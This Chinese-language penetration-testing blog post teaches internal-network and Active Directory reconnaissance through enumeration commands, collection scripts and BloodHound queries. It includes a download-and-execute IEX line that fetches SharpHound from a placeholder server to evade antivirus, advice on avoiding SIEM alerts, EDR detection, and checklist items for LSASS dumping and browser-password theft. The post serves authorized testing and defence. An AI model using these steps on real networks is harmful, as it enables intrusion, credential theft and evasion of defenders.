---
title: 内网信息收集方法论
date: 2025-02-05 08:00:00
tags:
  - 信息收集
  - 内网渗透
  - 渗透测试
description: 内网信息收集方法论——域信息收集、WMI/PowerShell 脚本与 BloodHound 数据采集。
categories: 渗透测试
---

## 一、引言

内网渗透的成败往往取决于信息收集的深度与广度。攻击者获得初始立足点后，必须迅速绘制目标网络拓扑、识别关键资产、定位域控制器并评估横向移动路径。本文系统化梳理核心技术与工具，提供可落地的脚本与完整检查清单。

> **声明：** 本文所述技术仅供安全研究、授权渗透测试及防守方蓝队建设使用。未经授权对他人系统进行信息收集或渗透测试属于违法行为。

## 二、网络基础信息收集

### 2.1 IP 配置与路由

获取主机 IP、子网掩码、网关及 DNS 服务器是绘制内网地图的第一步。

```powershell
# Windows
ipconfig /all                  # 完整IP配置（含DHCP服务器、DNS后缀）
ipconfig /displaydns           # DNS缓存，可能泄露内部域名
route print                    # 路由表

# Linux
ifconfig -a                    # 所有网络接口
ip addr show && ip route show  # 现代替代
route -n                       # 路由表
```

路由表揭示内网网段、VPN 子网及出口网关。

### 2.2 ARP 缓存与会话发现

```powershell
arp -a                         # Windows / Linux 通用，同网段主机发现
netsh advfirewall show allprofiles  # 防火墙策略
netsh wlan show profiles            # WiFi历史（笔记本场景）

# 快速 Ping 扫描 C 段
1..254 | % { $ip="192.168.1.$_"; if(Test-Connection $ip -Count 1 -Quiet){Write-Host "[+] $ip"} }
```

### 2.3 网络连接与会话

```bash
netstat -ano                   # Windows: 所有TCP/UDP连接及PID
ss -tunap                      # Linux 现代替代
```

重点关注 LISTENING 及 ESTABLISHED 连接。关键端口：445(SMB)、3389(RDP)、5985(WinRM)、1433(MSSQL)、3306(MySQL)、6379(Redis)。

```powershell
net session                    # 活动SMB会话 → 推断管理员维护的主机（高价值）
schtasks /query /fo LIST /v    # 计划任务
sc query state= all            # 所有服务
```

## 三、DNS 与 DHCP 服务发现

### 3.1 DNS 信息收集

```powershell
nslookup -type=all <target>
Resolve-DnsName <target> -Type A
# DNS缓存分析 — 提取本机曾访问域名
ipconfig /displaydns | Select-String "Record Name" | Select-Object -Unique
```

DNS 区域传送漏洞检测：`nslookup` → `server <DNS_IP>` → `ls -d <域名>`，成功则严重信息泄露。

### 3.2 DHCP 服务器定位

```powershell
ipconfig /all | findstr /i "DHCP Server"
netsh dhcp client show state
```

域环境中 DHCP 常与域控部署在一起，定位它等同于发现关键基础设施。

## 四、域环境信息收集

### 4.1 域基础信息

```cmd
REM === 域归属确认 ===
net config workstation         # 工作站域/DNS域名
systeminfo                     # 系统信息（域、补丁）
whoami /all                    # 当前权限与特权

REM === 域控制器定位 ===
set logonserver                # 当前认证服务器
nltest /dclist:<DomainName>    # 所有域控制器
nltest /domain_trusts          # 信任关系（子域/父域/跨林 → 横向移动边界）
```

### 4.2 域用户与组枚举

```cmd
REM === 用户 ===
net user /domain                       # 所有域用户
net user <username> /domain            # 指定用户详情
wmic useraccount get name,sid,status   # WMI方式

REM === 关键组 ===
net group /domain                      # 域全局组
net group "Domain Admins" /domain      # DA组成员 — 最高价值目标
net group "Enterprise Admins" /domain  # 企业管理员
net group "Domain Controllers" /domain # 域控计算机
net group "Domain Computers" /domain   # 域内计算机

REM === 本地组（本机提权路径分析） ===
net localgroup Administrators          # 本机管理员
net localgroup "Remote Desktop Users"  # RDP用户
```

### 4.3 AD 深度查询

```powershell
# 方式一：ActiveDirectory 模块（需 RSAT）
Get-ADUser -Filter * -Properties LastLogonDate,Enabled | Select Name,SamAccountName
Get-ADComputer -Filter * -Properties OperatingSystem,LastLogonDate
Get-ADGroup -Filter * | Select Name,GroupCategory,GroupScope

# 方式二：ADSI（无需AD模块，通用性更强）
$s = New-Object DirectoryServices.DirectorySearcher([ADSI]"LDAP://DC=domain,DC=com")
$s.Filter = "(&(objectCategory=user)(objectClass=user))"
$s.PageSize = 1000
$s.FindAll() | % { $_.Properties['samaccountname'] }
```

## 五、WMI / CMD / PowerShell 收集脚本

### 5.1 WMI 系统信息

WMI 默认运行且日志较少，是内网信息收集利器。

```powershell
wmic os get Caption,Version,OSArchitecture,LastBootUpTime,TotalVisibleMemorySize /format:list
wmic process get Name,ProcessId,ExecutablePath,CommandLine /format:csv  # 进程+命令行
wmic product get Name,Version,Vendor /format:csv                        # 已安装软件
wmic qfe get Caption,Description,HotFixID,InstalledOn                   # 补丁（提权分析）
wmic startup get Caption,Command,Location,User                          # 启动项
wmic share get Name,Path,Description                                    # 共享文件夹
```

### 5.2 综合 PowerShell 脚本

```powershell
function Invoke-Infogather {
    param([string]$Dir="C:\Users\Public\recon")
    New-Item -ItemType Directory -Force -Path $Dir | Out-Null
    $t=Get-Date -Format "yyyyMMdd_HHmmss"
    Write-Host "[*] 开始信息收集..." -ForegroundColor Yellow

    ipconfig /all > "$Dir\$($t)_ip.txt"
    route print   > "$Dir\$($t)_route.txt"
    arp -a        > "$Dir\$($t)_arp.txt"
    netstat -ano  > "$Dir\$($t)_netstat.txt"
    systeminfo    > "$Dir\$($t)_sys.txt"
    wmic qfe get Caption,HotFixID,InstalledOn > "$Dir\$($t)_patch.txt"
    whoami /all   > "$Dir\$($t)_whoami.txt"
    net user /domain 2>$null > "$Dir\$($t)_domain_users.txt"
    net group /domain 2>$null > "$Dir\$($t)_domain_groups.txt"
    net group "Domain Admins" /domain 2>$null > "$Dir\$($t)_da.txt"
    net session 2>$null > "$Dir\$($t)_session.txt"
    tasklist /v /fo csv > "$Dir\$($t)_proc.csv"
    sc query state= all > "$Dir\$($t)_svc.txt"
    netsh advfirewall show allprofiles > "$Dir\$($t)_fw.txt"
    nltest /domain_trusts 2>$null > "$Dir\$($t)_trusts.txt"
    nltest /dclist: 2>$null > "$Dir\$($t)_dc.txt"

    Write-Host "[+] 收集完成: $Dir" -ForegroundColor Green
}
# 执行: Invoke-Infogather
```

### 5.3 CMD 兼容版本（受限环境）

```batch
@echo off
set O=C:\Users\Public\recon & mkdir %O% 2>nul
ipconfig /all > %O%\ip.txt & route print > %O%\route.txt
arp -a > %O%\arp.txt & netstat -ano > %O%\net.txt
systeminfo > %O%\sys.txt & whoami /all > %O%\whoami.txt
net user /domain > %O%\domain_users.txt 2>&1
net group /domain > %O%\domain_groups.txt 2>&1
net group "Domain Admins" /domain > %O%\da.txt 2>&1
net localgroup Administrators > %O%\admin.txt
net session > %O%\session.txt 2>&1
tasklist /svc > %O%\tasks.txt & net share > %O%\shares.txt
set logonserver > %O%\logonserver.txt
echo [+] Complete: %O%
```

## 六、BloodHound 数据采集与分析

BloodHound 利用图论算法分析 AD 环境中的隐藏攻击路径，是域权限分析最强大的工具。

### 6.1 SharpHound 采集

```powershell
# 反射加载（不落地文件，规避AV）
IEX(New-Object Net.WebClient).DownloadString('http://<server>/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All -ZipFileName recon.zip

# 可执行文件方式
SharpHound.exe -c All --zipfilename recon.zip

# 关键参数:
# -c All           全部采集（Session/LoggedOn/Group/ACL/Trusts/ObjectProps）
# -c Session       仅会话（最轻量，降低检测风险）
# --Throttle 500   限制LDAP请求频率，避免SIEM告警
# --Loop           循环采集，捕获动态会话变化
```

### 6.2 环境启动

```bash
sudo neo4j console      # 图数据库 (neo4j:neo4j)
bloodhound              # GUI
```

### 6.3 核心 Cypher 查询

```cypher
// DA组成员
MATCH (u:User)-[:MemberOf]->(:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'}) RETURN u.name

// 拥有DA会话的计算机 — 横向移动跳板
MATCH (c:Computer)-[:HasSession]->(u:User)-[:MemberOf]->(:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'})
RETURN c.name, u.name

// 非约束委派
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name

// Kerberoastable高价值用户
MATCH (u:User {hasspn:true}) WHERE u.name =~ '(?i).*admin.*' RETURN u.name, u.serviceprincipalnames

// 当前用户到DA的最短攻击路径
MATCH p = shortestPath((u:User {name:'CUR_USER@DOMAIN.LOCAL'})-[*1..]->(:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'})) RETURN p

// 高风险ACL提权路径
MATCH (u)-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner|Owns]->(c:Computer) RETURN u.name,type(r),c.name
```

### 6.4 SharpHound 注意事项

| 项目 | 说明 |
|------|------|
| 频率控制 | `--Throttle` 限制请求间隔，避免SIEM告警 |
| 采集顺序 | 先 `Session`/`LoggedOn` 轻量采集，再扩展 |
| 规避检测 | 优先反射加载，避免 exe 落盘 |
| LDAP签名 | 部分环境启用后采集可能失败 |
| 数据安全 | ZIP含敏感信息，传输后立即清理 |

## 七、信息收集流程图

```
[取得初始立足点]
        │
        ▼
[网络基础]  ──  ipconfig / ifconfig, route, arp -a, netsh
        │
        ▼
[连接会话]  ──  netstat -ano, net session, 端口服务识别
        │
        ▼
[系统信息]  ──  systeminfo, wmic qfe (补丁), tasklist, 防病毒识别
        │
        ▼
[用户权限]  ──  whoami /all, 本地组管理员, 保存凭据检查
        │
        ▼
[DNS/DHCP]  ──  nslookup, ipconfig /displaydns, DHCP 定位
        │
        ▼
[域环境]    ──  net group /domain, net user /domain, nltest dclist, 域信任
        │
        ▼
[AD 查询]   ──  ADSI / Get-ADUser, Get-ADComputer, SPN 枚举
        │
        ▼
[BloodHound]──  SharpHound 采集 → Neo4j → 攻击路径分析
        │
        ▼
[横向移动规划]── 评估攻击路径 → 确定跳板机 → 执行横向
```

## 八、完整检查清单

### 主机层面
- [ ] `ipconfig /all` — IP、DNS、DHCP 服务器
- [ ] `route print` — 路由表，识别可达网段
- [ ] `arp -a` — 同网段主机发现
- [ ] `netstat -ano` — 端口/连接/PID
- [ ] `systeminfo` — OS 版本、补丁级别、域归属
- [ ] `wmic qfe list` — 完整补丁列表（CVE 对照）
- [ ] `tasklist /svc` — 进程+服务，识别 EDR/AV
- [ ] `wmic product get name,version` — 软件版本 CVE 检查
- [ ] `net share` — 共享文件夹
- [ ] `whoami /all` — Token 特权与组成员
- [ ] `cmdkey /list` — 保存的凭据
- [ ] `vaultcmd /listcreds` — Windows 凭据管理器
### 域层面

- [ ] `net config workstation` — 确认域成员身份
- [ ] `set logonserver` — 当前认证 DC
- [ ] `nltest /dclist:<domain>` — 全部域控制器
- [ ] `nltest /domain_trusts` — 信任关系
- [ ] `net user /domain` — 域用户列表
- [ ] `net group /domain` — 域组列表
- [ ] `net group "Domain Admins" /domain` — DA 成员
- [ ] `net group "Enterprise Admins" /domain` — EA 成员
- [ ] `net group "Domain Controllers" /domain` — DC 计算机
- [ ] `net localgroup Administrators` — 本机管理员
- [ ] `net session` — 入站 SMB 会话
### 深度枚举与凭据收集

- [ ] ADSI / Get-ADUser — 用户属性（Description 字段常含密码线索）
- [ ] SPN 枚举 — Kerberoasting 候选（HTTP, MSSQL, TERMSRV）
- [ ] SharpHound 全量采集 → BloodHound 攻击路径分析
- [ ] AS-REP Roasting 候选用户检查
- [ ] LSASS dump — 内存凭据提取
- [ ] 配置文件 — `web.config`、`Unattend.xml`、GPP cpassword
- [ ] PowerShell 历史 — `ConsoleHost_history.txt`
- [ ] RDP 连接历史 — 注册表查询
- [ ] 浏览器密码 — Chrome, Edge, Firefox
### 安全产品识别

```powershell
Get-Process | ? { $_.Name -match "MsMpEng|csfalcon|SentinelAgent|cbdefense|sophos|trend" }
Get-Process | ? { $_.ProcessName -eq "Sysmon" }
Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
```

## 九、总结

内网信息收集遵循循序渐进、由浅入深的原则：
1. **先轻后重** — 优先低风险操作（本地配置、ARP 表），避免过早触发告警。
2. **横向关联** — 单条信息有限，组合后可揭示攻击路径（ARP + net session → 管理员工作站定位）。
3. **工具整合** — 手工命令初侦，BloodHound 系统化 AD 分析，二者互补。
4. **动态持续** — 域环境动态变化，定期重新采集捕获新增会话与权限关系。
5. **痕迹管理** — 授权测试结束后清理落地文件与临时目录。
掌握本文方法论后，渗透测试人员可在有限时间内高效绘制目标网络全貌，为横向移动与权限提升奠定坚实基础。
---

> **Disclaimer:** 本文所有内容仅供安全研究与授权测试参考。未经系统所有者书面授权，禁止对任何系统进行扫描、渗透或数据采集。使用者须自行承担一切法律后果。
